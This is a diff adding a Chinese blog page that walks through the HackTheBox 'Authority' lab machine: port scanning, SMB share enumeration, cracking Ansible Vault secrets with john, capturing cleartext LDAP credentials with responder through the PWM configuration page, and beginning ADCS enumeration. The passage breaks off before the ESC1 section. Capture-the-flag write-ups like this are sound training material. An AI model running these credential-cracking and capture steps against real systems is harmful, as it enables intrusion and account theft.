@@ -1,0 +1,1161 @@
+<!doctype html>
+<html
+  lang="zh-cn" 
+  data-theme-mode="auto"
+  >
+  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8" />
+<meta
+  name="viewport"
+  content="width=device-width, initial-scale=1, shrink-to-fit=no"
+/><title>
+  HTB Authority | Ya1orin
+</title>
+<meta name="description" content="HackTheBox篇ADCS系列之Authority"/><script>
+  window.siteConfig = JSON.parse("{\"anchor_icon\":null,\"base\":\"http://localhost:1313/\",\"clipboard\":{\"copyright\":{\"count\":50,\"enable\":false,\"license_type\":\"by-nc-sa\"},\"fail\":{\"en\":\"Copy failed (ﾟ⊿ﾟ)ﾂ\",\"ja\":\"コピー失敗 (ﾟ⊿ﾟ)ﾂ\",\"pt-br\":\"Falha ao copiar (ﾟ⊿ﾟ)ﾂ\",\"zh-cn\":\"复制失败 (ﾟ⊿ﾟ)ﾂ\",\"zh-tw\":\"複製失敗 (ﾟ⊿ﾟ)ﾂ\"},\"success\":{\"en\":\"Copy successfully (*^▽^*)\",\"ja\":\"コピー成功 (*^▽^*)\",\"pt-br\":\"Copiado com sucesso (*^▽^*)\",\"zh-cn\":\"复制成功 (*^▽^*)\",\"zh-tw\":\"複製成功 (*^▽^*)\"}},\"code_block\":{\"expand\":true},\"i18n_languages\":[{\"Lang\":\"en\",\"LanguageName\":\"English\",\"LanguageCode\":\"\",\"Title\":\"\",\"LanguageDirection\":\"\",\"Weight\":1,\"Disabled\":false},{\"Lang\":\"zh-cn\",\"LanguageName\":\"简体中文\",\"LanguageCode\":\"\",\"Title\":\"\",\"LanguageDirection\":\"\",\"Weight\":1,\"Disabled\":false}],\"icon_font\":\"4552607_4k4bc36ef96\",\"outdate\":{\"daysago\":180,\"enable\":false,\"message\":{\"en\":\"This article was last updated on {time}. Please note that the content may no longer be applicable.\",\"ja\":\"この記事は最終更新日：{time}。記載内容が現在有効でない可能性がありますのでご注意ください。\",\"pt-br\":\"Este artigo foi atualizado pela última vez em {time}. Observe que o conteúdo pode não ser mais aplicável.\",\"zh-cn\":\"本文最后更新于 {time}，请注意文中内容可能已不适用。\",\"zh-tw\":\"本文最後更新於 {time}，請注意文中內容可能已不適用。\"}}}");
+  
+</script>
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+<link
+  rel="preload"
+  as="style"
+  href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7cNoto%20Serif%20SC:400,400italic,700,700italic%7c&amp;display=swap"
+/>
+<link
+  rel="stylesheet"
+  href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7cNoto%20Serif%20SC:400,400italic,700,700italic%7c&amp;display=swap"
+  media="print"
+  onload="this.media='all'"
+/>
+<link
+    rel="preload"
+    href="//at.alicdn.com/t/c/font_4552607_4k4bc36ef96.woff2"
+    as="font"
+    type="font/woff2"
+    crossorigin="anonymous"
+  /><link rel="stylesheet" href="/css/loader.css" />
+<meta property="og:type" content="website" />
+  <meta property="og:title" content="HTB Authority | Ya1orin" />
+  <meta
+    property="og:description"
+    content="HackTheBox篇ADCS系列之Authority"
+  />
+  <meta property="og:url" content="http://localhost:1313/post/htb-authority/" />
+  <meta
+    property="og:site_name"
+    content="Ya1orin"
+  />
+  <meta
+    property="og:image"
+    content="/"
+  />
+  <meta property="article:author" content="Ya1orin" />
+  <meta property="article:published_time" content="2025-03-20T12:51:09&#43;08:00" />
+  <meta property="article:modified_time" content="2025-11-11T15:05:42&#43;08:00" /><meta property="article:tag" content="WindowsADCS-ESC1PassTheCert" /><meta name="twitter:card" content="summary" />
+  <meta name="twitter:image" content="/" />
+<link rel="shortcut icon" href="/favicon.ico"><link rel="stylesheet" href="/css/main.css" />
+<link
+    rel="preload"
+    as="style"
+    href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css"
+    integrity="sha384-IfxC36XL/toUyJ939C73PcgMuRzAZuIzZxE38drsmO5p6jD7ei&#43;Zx/1oA/0l8ysE" crossorigin="anonymous"onload="this.onload=null;this.rel='stylesheet'"
+  /><link
+    rel="preload"
+    as="style"
+    href="https://npm.webcache.cn/katex@0.16.24/dist/katex.min.css"
+    integrity="sha384-tTgKLjMYmJr94v8qu2PE5MUGSMbyN2xiH266JUB3gpm8vnnJywd1dWSOEfrFz&#43;YI" crossorigin="anonymous"onload="this.onload=null;this.rel='stylesheet'"
+  /><link
+    rel="stylesheet"
+    href="https://npm.webcache.cn/gitalk@1.8.0/dist/gitalk.css"
+    integrity="sha384-X7z7PUv2B67D8sPJyzDyGZSco1ADwmdI7ed4eCGtTKkClfyDFpPL9WgAn9XVr/Io" crossorigin="anonymous"/><script
+    src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js"
+    integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script><link
+    rel="stylesheet"
+    href="https://npm.webcache.cn/@reimujs/aos@0.1.2/dist/aos.css"
+    integrity="sha384-GMRP93c6Hkz9JVKGAuRR3nTS7M07RwPgTFenXiosjq2VbVgvdDNcz1g6Mkj8AONa" crossorigin="anonymous"/></head>
+  <body><div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi rotate"><svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+          M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg></div><div class="loading-word">Loading...</div>
+    </div>
+  </div>
+  </div>
+  <script>
+    var time = null;
+    var loaderEl = document.getElementById('loader');
+    var startLoading = () => {
+      time = Date.now();
+      loaderEl.classList.remove("loading");
+    }
+    var hideLoader = () => {
+      document.body.style.overflow = 'auto';
+      loader.classList.add('loading');
+    };
+
+    var endLoading = () => {
+      if (!time) {
+        hideLoader();
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          hideLoader();
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    loaderEl.addEventListener('click', endLoading);
+  </script><div id="copy-tooltip"></div>
+<div id="lang-tooltip">
+本文章没有找到对应的语言版本
+</div>
+<div id="heatmap-tooltip"></div><div id="container">
+      <div id="wrap"><div id="header-nav">
+  <nav id="main-nav" aria-label="Primary navigation"><a class="main-nav-link-wrap" href="/">
+        <div class='main-nav-icon icon rotate'>&#xe62b;</div>
+        <span class="main-nav-link">首页</span>
+      </a><a class="main-nav-link-wrap" href="/archives">
+        <div class='main-nav-icon icon rotate'>&#xe62b;</div>
+        <span class="main-nav-link">归档</span>
+      </a><a class="main-nav-link-wrap" href="/about">
+        <div class='main-nav-icon icon rotate'>&#xe62b;</div>
+        <span class="main-nav-link">关于</span>
+      </a><a class="main-nav-link-wrap" href="/friend">
+        <div class='main-nav-icon icon rotate'>&#xe62b;</div>
+        <span class="main-nav-link">友链</span>
+      </a><a id="main-nav-toggle" class="nav-icon" aria-label="Toggle navigation" role="button"></a>
+  </nav>
+  <nav id="sub-nav" aria-label="Secondary navigation"><a id="nav-search-btn" class="nav-icon popup-trigger" title="搜索" aria-label="搜索"></a></nav><nav id="i18n-nav" aria-label="Language selection">
+      <div class="custom-dropdown">
+        <div class="select-selected" id="select-selected" role="button" aria-haspopup="listbox" aria-expanded="false" aria-label="Language menu">
+          <span id="nav-language-btn" class="nav-icon" style="padding: 0 20px 0 0"></span>
+          <span id="selected-lang">简体中文</span>
+        </div>
+        <ul class="select-items" id="select-items" role="listbox" aria-label="Languages"><li data-value="en" role="option" arial-selected="false" >English</li><li data-value="zh-cn" role="option" class="selected" arial-selected="true" >简体中文</li></ul>
+      </div>
+      <script>
+        var selectSelected = document.getElementById("select-selected");
+        var selectedLang = document.getElementById("selected-lang");
+        var selectItems = document.getElementById("select-items");
+        var selectOptions = selectItems.querySelectorAll("li");
+
+        selectSelected.addEventListener("click", () => {
+          selectItems.classList.toggle("show");
+          var expanded = selectSelected.getAttribute("aria-expanded") === "true";
+          selectSelected.setAttribute("aria-expanded", (!expanded).toString());
+        });
+
+        selectOptions.forEach((item) => {
+          item.addEventListener("click", () => {
+            const langMap = {};selectedLang.textContent = item.textContent;
+            selectItems.classList.remove("show");
+            selectOptions.forEach((option) => {
+              option.classList.remove("selected");
+            });
+            item.classList.add("selected");
+            if (item.dataset.value === 'zh-cn') {
+              return;
+            }
+            if (!langMap[item.dataset.value]) {
+              _$("#lang-tooltip").style.opacity = "1";
+              setTimeout(() => {
+                _$("#lang-tooltip").style.opacity = "0";
+              }, 1000);
+              return;
+            }
+            window.location = langMap[item.dataset.value];
+          });
+        });
+
+        document.addEventListener("click", (event) => {
+          if (!event.target.closest(".custom-dropdown")) {
+            selectItems.classList.remove("show");
+            selectSelected.setAttribute("aria-expanded", "false");
+          }
+        });
+      </script>
+    </nav></div>
+<header id="header" aria-label="Site header"><picture></picture><img  fetchpriority="high" src="/images/banner.webp" alt="HTB Authority"><div id="header-outer">
+    <div id="header-title"><span id="logo">
+            <h1 data-aos="slide-up">HTB Authority</h1>
+          </span><h2 id="subtitle-wrap" data-aos="slide-down"></h2></div>
+  </div>
+</header><div id="content"
+          aria-label="Page content"
+          class="sidebar-left"
+            ><aside id="sidebar" aria-label="Sidebar"><div class="sidebar-wrapper-container sticky"><div class="sidebar-wrapper">
+    <div
+      class="sidebar-wrap"
+      data-aos="fade-up"
+    ><div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目录</h3>
+<div class="sidebar-toc-wrapper toc-div-class">
+  <nav id="TableOfContents">
+  <ul>
+    <li><a href="#知识点">知识点</a></li>
+    <li><a href="#信息收集">信息收集</a></li>
+    <li><a href="#http服务">HTTP服务</a></li>
+    <li><a href="#smb信息收集">SMB信息收集</a></li>
+    <li><a href="#利用ldap捕获密码">利用LDAP捕获密码</a></li>
+    <li><a href="#esc1提权">ESC1提权</a></li>
+    <li><a href="#passthecert">PassTheCert</a></li>
+  </ul>
+</nav>
+</div></div>
+          <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img
+    data-src="/avatar/avatar.webp"
+    data-sizes="auto"
+    alt="Ya1orin"
+    class="lazyload"
+  />
+  <div class="sidebar-author-name">Ya1orin</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div><div class="sidebar-state-number">43</div>
+  </div>
+  <a class="sidebar-state-category" href="/categories/" aria-label="sidebar-state-category-link">
+    <div>分类</div>
+    <div class="sidebar-state-number">
+      3
+    </div>
+  </a>
+  <a class="sidebar-state-tag" href="/tags/" aria-label="sidebar-state-tag-link">
+    <div>标签</div>
+    <div class="sidebar-state-number">37</div>
+  </a>
+</div>
+<div class="sidebar-social"><div class="icon-github sidebar-social-icon">
+      <a
+        href="https://github.com/ya1orin"
+        itemprop="url"
+        target="_blank"
+        aria-label="github"
+        rel="noopener nofollow noreferrer"
+      ></a>
+    </div></div>
+<div class="sidebar-menu"><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/"
+        aria-label="首页"
+      ></a>
+      <div class='sidebar-menu-icon icon rotate'>&#xe62b;</div>
+      <div class="sidebar-menu-link">首页</div>
+    </div><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/archives"
+        aria-label="归档"
+      ></a>
+      <div class='sidebar-menu-icon icon rotate'>&#xe62b;</div>
+      <div class="sidebar-menu-link">归档</div>
+    </div><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/about"
+        aria-label="关于"
+      ></a>
+      <div class='sidebar-menu-icon icon rotate'>&#xe62b;</div>
+      <div class="sidebar-menu-link">关于</div>
+    </div><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/friend"
+        aria-label="友链"
+      ></a>
+      <div class='sidebar-menu-icon icon rotate'>&#xe62b;</div>
+      <div class="sidebar-menu-link">友链</div>
+    </div></div>
+</div><div class="sidebar-btn-wrapper" style="position:static">
+            <div class="sidebar-toc-btn current"></div>
+            <div class="sidebar-common-btn"></div>
+          </div></div>
+  </div><div class="sidebar-widget"></div></div></aside>
+<section id="main" aria-label="Main content"><article
+  class="h-entry article"
+  itemscope
+  itemtype="https://schema.org/BlogPosting"
+>
+  <div
+    class="article-inner"
+    data-aos="fade-up"
+  >
+    <div class="article-meta"><div class="article-date">
+  <span
+    class="article-date-link icon-calendar"
+    data-aos="zoom-in"
+  >
+    <time datetime="2025-03-20 12:51:09 &#43;0800 CST" itemprop="datePublished"
+      >2025-03-20</time
+    >
+    <time style="display: none;" id="post-update-time"
+      >2025-11-11</time
+    >
+  </span></div>
+<div class="article-category"><a
+      class="article-category-link"
+      href="/categories/hackthebox"
+      data-aos="zoom-in"
+      >HACKTHEBOX</a
+    ></div>
+</div><div class="hr-line"></div><div class="e-content article-entry" itemprop="articleBody"><blockquote>
+<p>靶机ip：10.10.11.222</p>
+</blockquote>
+<h1 id="知识点">
+<a class="header-anchor" href="#%e7%9f%a5%e8%af%86%e7%82%b9"></a>
+知识点
+</h1><ul>
+<li>ADCS枚举</li>
+<li>ESC1提权</li>
+<li>PassTheCert</li>
+</ul>
+<h1 id="信息收集">
+<a class="header-anchor" href="#%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86"></a>
+信息收集
+</h1><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">./rustscan -a 10.10.11.222 -u <span class="m">5000</span>
+</span></span><span class="line"><span class="cl">.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
+</span></span><span class="line"><span class="cl"><span class="p">|</span> <span class="o">{}</span>  <span class="o">}</span><span class="p">|</span> <span class="o">{</span> <span class="o">}</span> <span class="p">|</span><span class="o">{</span> <span class="o">{</span>__ <span class="o">{</span>_   _<span class="o">}{</span> <span class="o">{</span>__  /  ___<span class="o">}</span> / <span class="o">{}</span> <span class="se">\ </span><span class="p">|</span>  <span class="sb">`</span><span class="p">|</span> <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> .-. <span class="se">\|</span> <span class="o">{</span>_<span class="o">}</span> <span class="p">|</span>.-._<span class="o">}</span> <span class="o">}</span> <span class="p">|</span> <span class="p">|</span>  .-._<span class="o">}</span> <span class="o">}</span><span class="se">\ </span>    <span class="o">}</span>/  /<span class="se">\ </span> <span class="se">\|</span> <span class="p">|</span><span class="se">\ </span> <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="sb">`</span>-<span class="s1">&#39; `-&#39;</span><span class="sb">`</span>-----<span class="s1">&#39;`----&#39;</span>  <span class="sb">`</span>-<span class="s1">&#39;  `----&#39;</span>  <span class="sb">`</span>---<span class="s1">&#39; `-&#39;</span>  <span class="sb">`</span>-<span class="s1">&#39;`-&#39;</span> <span class="sb">`</span>-<span class="s1">&#39;
+</span></span></span><span class="line"><span class="cl"><span class="s1">The Modern Day Port Scanner.
+</span></span></span><span class="line"><span class="cl"><span class="s1">________________________________________
+</span></span></span><span class="line"><span class="cl"><span class="s1">: http://discord.skerritt.blog         :
+</span></span></span><span class="line"><span class="cl"><span class="s1">: https://github.com/RustScan/RustScan :
+</span></span></span><span class="line"><span class="cl"><span class="s1"> --------------------------------------
+</span></span></span><span class="line"><span class="cl"><span class="s1">I don&#39;</span>t always scan ports, but when I <span class="k">do</span>, I prefer RustScan.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>~<span class="o">]</span> The config file is expected to be at <span class="s2">&#34;/root/.rustscan.toml&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>~<span class="o">]</span> Automatically increasing <span class="nb">ulimit</span> value to 5000.
+</span></span><span class="line"><span class="cl">Open 10.10.11.222:53
+</span></span><span class="line"><span class="cl">Open 10.10.11.222:80
+</span></span><span class="line"><span class="cl">Open 10.10.11.222:88
+</span></span><span class="line"><span class="cl">Open 10.10.11.222:135
+</span></span><span class="line"><span class="cl">Open 10.10.11.222:139
+</span></span><span class="line"><span class="cl">Open 10.10.11.222:389
+</span></span><span class="line"><span class="cl">Open 10.10.11.222:445
+</span></span><span class="line"><span class="cl">Open 10.10.11.222:464
+</span></span><span class="line"><span class="cl">Open 10.10.11.222:593
+</span></span><span class="line"><span class="cl">Open 10.10.11.222:636
+</span></span><span class="line"><span class="cl">Open 10.10.11.222:3268
+</span></span><span class="line"><span class="cl">Open 10.10.11.222:3269
+</span></span><span class="line"><span class="cl">Open 10.10.11.222:5985
+</span></span><span class="line"><span class="cl">Open 10.10.11.222:8443
+</span></span><span class="line"><span class="cl">Open 10.10.11.222:9389
+</span></span><span class="line"><span class="cl">Open 10.10.11.222:47001
+</span></span><span class="line"><span class="cl">Open 10.10.11.222:49664
+</span></span><span class="line"><span class="cl">Open 10.10.11.222:49665
+</span></span><span class="line"><span class="cl">Open 10.10.11.222:49666
+</span></span><span class="line"><span class="cl">Open 10.10.11.222:49667
+</span></span><span class="line"><span class="cl">Open 10.10.11.222:49673
+</span></span><span class="line"><span class="cl">Open 10.10.11.222:49690
+</span></span><span class="line"><span class="cl">Open 10.10.11.222:49691
+</span></span><span class="line"><span class="cl">Open 10.10.11.222:49693
+</span></span><span class="line"><span class="cl">Open 10.10.11.222:49694
+</span></span><span class="line"><span class="cl">Open 10.10.11.222:49703
+</span></span><span class="line"><span class="cl">Open 10.10.11.222:49715
+</span></span><span class="line"><span class="cl">Open 10.10.11.222:65418
+</span></span><span class="line"><span class="cl">Open 10.10.11.222:65467
+</span></span></code></pre></div><h1 id="http服务">
+<a class="header-anchor" href="#http%e6%9c%8d%e5%8a%a1"></a>
+HTTP服务
+</h1><p>80端口是个正常的IIS页面</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20250320182705578-1966780528.png" alt="image-20250320182702632"></p>
+<p>注意到有个8443特别的端口，尝试访问一下</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20250320161926717-387925342.png" alt="image-20250320161911292"></p>
+<p>发现是pwm登陆页面，没有准确的用户名密码</p>
+<h1 id="smb信息收集">
+<a class="header-anchor" href="#smb%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86"></a>
+SMB信息收集
+</h1><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">smbclient -L //10.10.11.222
+</span></span><span class="line"><span class="cl">Password <span class="k">for</span> <span class="o">[</span>WORKGROUP<span class="se">\r</span>oot<span class="o">]</span>:
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        Sharename       Type      Comment
+</span></span><span class="line"><span class="cl">        ---------       ----      -------
+</span></span><span class="line"><span class="cl">        ADMIN$          Disk      Remote Admin
+</span></span><span class="line"><span class="cl">        C$              Disk      Default share
+</span></span><span class="line"><span class="cl">        Department Shares Disk
+</span></span><span class="line"><span class="cl">        Development     Disk
+</span></span><span class="line"><span class="cl">        IPC$            IPC       Remote IPC
+</span></span><span class="line"><span class="cl">        NETLOGON        Disk      Logon server share
+</span></span><span class="line"><span class="cl">        SYSVOL          Disk      Logon server share
+</span></span><span class="line"><span class="cl">Reconnecting with SMB1 <span class="k">for</span> workgroup listing.
+</span></span><span class="line"><span class="cl">do_connect: Connection to 10.10.11.222 failed <span class="o">(</span>Error NT_STATUS_RESOURCE_NAME_NOT_FOUND<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Unable to connect with SMB1 -- no workgroup available
+</span></span></code></pre></div><p>发现有<code>Development</code>可以匿名访问</p>
+<p>可以找到关键的<code>/Automation/Ansible/PWM/defaults/main.yml</code> 文件，同时可以发现有ADCS服务</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20250320182437854-1899444192.png" alt="image-20250320182434726"></p>
+<p>找到pwm加密的密码</p>
+<p>通过问Deepseek得知，这是通过<code>Ansible Vault</code>加密的数据，可以使用 <code>ansible2john</code> 将该哈希转为可以被爆破的形式，并且通过哈希爆破得到密钥，使用得到的密钥即可解密数据得到用户的明文密码</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="nv">$ANSIBLE_VAULT</span><span class="p">;</span>1.1<span class="p">;</span>AES256
+</span></span><span class="line"><span class="cl">326665343864353665376531366637316331386162643232303835663339663466623131613262396134353663663462373265633832356663356239383039640a346431373431666433343434366139356536343763336662346134663965343430306561653964643235643733346162626134393430336334326263326364380a6530343137333266393234336261303438346635383264396362323065313438
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$ANSIBLE_VAULT</span><span class="p">;</span>1.1<span class="p">;</span>AES256
+</span></span><span class="line"><span class="cl">313563383439633230633734353632613235633932356333653561346162616664333932633737363335616263326464633832376261306131303337653964350a363663623132353136346631396662386564323238303933393362313736373035356136366465616536373866346138623166383535303930356637306461350a3164666630373030376537613235653433386539346465336633653630356531
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$ANSIBLE_VAULT</span><span class="p">;</span>1.1<span class="p">;</span>AES256
+</span></span><span class="line"><span class="cl">633038313035343032663564623737313935613133633130383761663365366662326264616536303437333035366235613437373733316635313530326639330a643034623530623439616136363563346462373361643564383830346234623235313163336231353831346562636632666539383333343238343230333633350a6466643965656330373334316261633065313363363266653164306135663764
+</span></span></code></pre></div><p>将上面hash分别保存至文件<code>pwm_admin_login_hash</code>、<code>pwm_admin_password_hash</code>、<code>ldap_admin_password_hash</code>中</p>
+<p>使用 <code>ansible2john</code> 转换成可以爆破的形式</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ansible2john pwm_admin_login_hash &gt; pwm_admin_login_hash.txt
+</span></span><span class="line"><span class="cl">ansible2john pwm_admin_password_hash &gt; pwm_admin_password_hash.txt
+</span></span><span class="line"><span class="cl">ansible2john ldap_admin_password_hash &gt; ldap_admin_password_hash.txt
+</span></span></code></pre></div><p>使用<code>john</code>爆破密钥</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">john pwm_admin_login_hash.txt --wordlist<span class="o">=</span>/usr/share/wordlists/rockyou.txt
+</span></span><span class="line"><span class="cl">john pwm_admin_password_hash.txt --wordlist<span class="o">=</span>/usr/share/wordlists/rockyou.txt
+</span></span><span class="line"><span class="cl">john ldap_admin_password_hash.txt --wordlist<span class="o">=</span>/usr/share/wordlists/rockyou.txt
+</span></span></code></pre></div><p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20250320185237658-1520004310.png" alt="image-20250320185235015"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20250320185246651-942398066.png" alt="image-20250320185244551"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20250320185409986-1298106594.png" alt="image-20250320185408004"></p>
+<p>发现密钥都是相同的，都是<code>!@#$%^&amp;*</code></p>
+<p>最后使用<code>ansible-vault</code>解密</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">ansible-vault decrypt pwm_admin_login_hash
+</span></span><span class="line"><span class="cl">ansible-vault decrypt pwm_admin_password_hash
+</span></span><span class="line"><span class="cl">ansible-vault decrypt ldap_admin_password_hash
+</span></span></code></pre></div><p>查看一下结果</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20250320185813914-460862144.png" alt="image-20250320185811710"></p>
+<p>发现对应的密码</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">pwm_admin_login_hash   			svc_pwm
+</span></span><span class="line"><span class="cl">pwm_admin_password_hash   		pWm_@dm!N_!23
+</span></span><span class="line"><span class="cl">ldap_admin_password_hash		DevT3st@123
+</span></span></code></pre></div><h1 id="利用ldap捕获密码">
+<a class="header-anchor" href="#%e5%88%a9%e7%94%a8ldap%e6%8d%95%e8%8e%b7%e5%af%86%e7%a0%81"></a>
+利用LDAP捕获密码
+</h1><p>拿到密码<code>pWm_@dm!N_!23</code>后，查看8443的PWM服务，点击<code>Configuration Editor</code>，输入密码成功登录</p>
+<p>我们在配置页面中，找到一处可以发起 LDAP 认证的功能。我们在此处新建一个URL，地址为攻击机<code>responder</code>的地址。然后我们开启攻击机的<code>responder</code>，再点击网页上的<code>Test LDAP Profile</code>。就可以捕获到受害机向攻击机发起的LDAP认证数据。</p>
+<p><strong>注：此处LDAP使用389端口，是因为389端口是明文流量，认证信息会被明文传输。</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20250320190553448-208337479.png" alt="image-20250320190551551"></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Listening <span class="k">for</span> events...
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>LDAP<span class="o">]</span> Attempting to parse an old simple Bind request.
+</span></span><span class="line"><span class="cl"><span class="o">[</span>LDAP<span class="o">]</span> Cleartext Client   : 10.10.11.222
+</span></span><span class="line"><span class="cl"><span class="o">[</span>LDAP<span class="o">]</span> Cleartext Username : <span class="nv">CN</span><span class="o">=</span>svc_ldap,OU<span class="o">=</span>Service Accounts,OU<span class="o">=</span>CORP,DC<span class="o">=</span>authority,DC<span class="o">=</span>htb
+</span></span><span class="line"><span class="cl"><span class="o">[</span>LDAP<span class="o">]</span> Cleartext Password : lDaP_1n_th3_cle4r!
+</span></span><span class="line"><span class="cl"><span class="o">[</span>LDAP<span class="o">]</span> Attempting to parse an old simple Bind request.
+</span></span><span class="line"><span class="cl"><span class="o">[</span>LDAP<span class="o">]</span> Cleartext Client   : 10.10.11.222
+</span></span><span class="line"><span class="cl"><span class="o">[</span>LDAP<span class="o">]</span> Cleartext Username : <span class="nv">CN</span><span class="o">=</span>svc_ldap,OU<span class="o">=</span>Service Accounts,OU<span class="o">=</span>CORP,DC<span class="o">=</span>authority,DC<span class="o">=</span>htb
+</span></span><span class="line"><span class="cl"><span class="o">[</span>LDAP<span class="o">]</span> Cleartext Password : lDaP_1n_th3_cle4r!
+</span></span></code></pre></div><p>得到<code>svc_ldap</code> 用户的密码</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">username: svc_ldap
+</span></span><span class="line"><span class="cl">password: lDaP_1n_th3_cle4r!
+</span></span></code></pre></div><p>使用<code>netexec</code>工具进一步枚举</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20250320190853766-781346724.png" alt="image-20250320190851336"></p>
+<p>发现可以登录，使用<code>evil-winrm</code>登录</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20250320191024470-924325067.png" alt="image-20250320191021244"></p>
+<p>登陆成功，在<code>Desktop</code>找到<code>user.txt</code></p>
+<h1 id="esc1提权">
+<a class="header-anchor" href="#esc1%e6%8f%90%e6%9d%83"></a>
+ESC1提权
+</h1><p>由于之前发现到存在ADCS服务，并且通过信息收集后发现只存在<code>svc_ldap</code>低权用户，使用<code>netexec </code>尝试在域中枚举ADCS</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">netexec ldap 10.10.11.222 -u <span class="s1">&#39;svc_ldap&#39;</span> -p <span class="s1">&#39;lDaP_1n_th3_cle4r!&#39;</span> -M adcs
+</span></span><span class="line"><span class="cl">SMB         10.10.11.222    <span class="m">445</span>    AUTHORITY        <span class="o">[</span>*<span class="o">]</span> Windows <span class="m">10</span> / Server <span class="m">2019</span> Build <span class="m">17763</span> x64 <span class="o">(</span>name:AUTHORITY<span class="o">)</span> <span class="o">(</span>domain:authority.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+</span></span><span class="line"><span class="cl">LDAPS       10.10.11.222    <span class="m">636</span>    AUTHORITY        <span class="o">[</span>+<span class="o">]</span> authority.htb<span class="se">\s</span>vc_ldap:lDaP_1n_th3_cle4r!
+</span></span><span class="line"><span class="cl">ADCS        10.10.11.222    <span class="m">389</span>    AUTHORITY        <span class="o">[</span>*<span class="o">]</span> Starting LDAP search with search filter <span class="s1">&#39;(objectClass=pKIEnrollmentService)&#39;</span>
+</span></span><span class="line"><span class="cl">ADCS        10.10.11.222    <span class="m">389</span>    AUTHORITY        Found PKI Enrollment Server: authority.authority.htb
